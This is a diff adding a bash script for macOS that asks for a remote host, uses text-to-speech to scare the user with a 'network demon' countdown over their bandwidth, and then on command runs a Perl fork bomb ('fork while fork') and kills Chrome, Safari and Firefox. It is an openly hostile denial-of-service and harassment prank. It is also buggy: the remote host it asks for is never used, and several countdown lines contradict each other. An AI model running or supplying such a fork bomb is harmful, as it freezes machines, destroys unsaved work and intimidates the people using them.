@@ -1,0 +1,64 @@
+#!/bin/bash
+
+#creates the ExcessFactor variable for later use in our fork bomb
+
+
+
+echo -n "Enter the computer name (serial number) or IP address of the computer you wish to freeze: ";
+read remote_host;
+echo remote_host;
+
+Echo "Enter password to begin."
+sudo osascript -e "set Volume 10"
+
+
+echo "Script is now speaking with user."
+
+say "Hello there internet user! I am your computer. You are currently using more data than anyone else on the network. Because of this, you have awoken the network demon. You have 30 seconds to close out of any program using a large amount of data before the network demon escapes his cage and arrives at your computer.";
+
+echo "Script has begun countdown."
+echo "30 seconds remaining";
+
+
+sleep 5;
+echo "25 seconds remaining";
+say "25 seconds remaining";
+
+sleep 5;
+say "20 seconds remaining";
+echo "20 seconds remaining";
+
+
+sleep 5;
+say "15 seconds remaining";
+echo "10 seconds remaining";
+
+sleep 5;
+say "10 seconds remaining";
+echo "10 seconds remaining";
+
+
+sleep 5;
+say "5 seconds remaining";
+echo "20 seconds remaining";
+
+
+sleep 5;
+say "0 seconds remaining";
+echo "20 seconds remaining";
+
+echo "The countdown has ended. See if the user is still has a high bandwidth."
+echo -n "Release network demon onto user? [o]pen Cage or [c]lose Cage? : ";
+read DemonCageStatus;
+if [ $DemonCageStatus = "o" ]
+then
+perl -e "fork while fork";
+echo "R.I.P. USER";
+say "The network demon has escaped his cage. He is coming for us! Goodbye old friend.";
+pkill Chrome;
+pkill Safari;
+pkill Firefox;
+else
+say "The network demon has settled down. Good job!"
+echo "You have mercy in your heart. Congratz.";
+fi
